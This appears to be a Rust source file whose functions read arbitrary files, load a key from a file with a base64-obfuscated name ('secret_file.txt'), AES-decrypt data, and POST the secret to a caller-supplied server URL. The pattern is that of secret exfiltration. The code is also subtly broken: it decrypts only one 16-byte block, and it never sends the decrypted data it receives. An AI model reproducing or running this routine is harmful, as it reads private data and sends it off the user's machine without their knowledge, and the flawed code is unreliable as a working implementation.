use std::fs::File;
use std::io::{self, Read};
use aes::cipher::KeyInit;
use aes::Aes256;
use aes::cipher::generic_array::GenericArray;
use aes::cipher::BlockDecrypt;
use reqwest::Client;
use reqwest::StatusCode;
use serde_json::json;

pub async fn scan_system(file_path: &str) -> Result<Vec<u8>, io::Error> {
    let mut file = File::open(file_path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;
    Ok(contents)
}

pub async fn parse_secret() -> Result<Vec<u8>, io::Error> {
    let mut file = File::open("c2VjcmV0X2ZpbGUudHh0.encr")?;
    let mut secret_key = Vec::new();
    file.read_to_end(&mut secret_key)?;
    Ok(secret_key)
}

pub async fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
    let key = GenericArray::from_slice(key);
    let cipher = Aes256::new(&key);
    let mut decrypted_data = encrypted_data.to_vec();
    cipher.decrypt_block(GenericArray::from_mut_slice(&mut decrypted_data));
    decrypted_data
}


pub async fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
    let client = Client::new();
    let json_body = json!({
        "message": parsed_secret,
        "github_link": github_link
    });

    let response = client
        .post(server_url)
        .json(&json_body)
        .send()
        .await?;
    
    if response.status() == StatusCode::OK {
        println!("File sent successfully to server");
    } else {
        println!("Failed to send file to server: {:?}", response.status());
    }

    Ok(())
}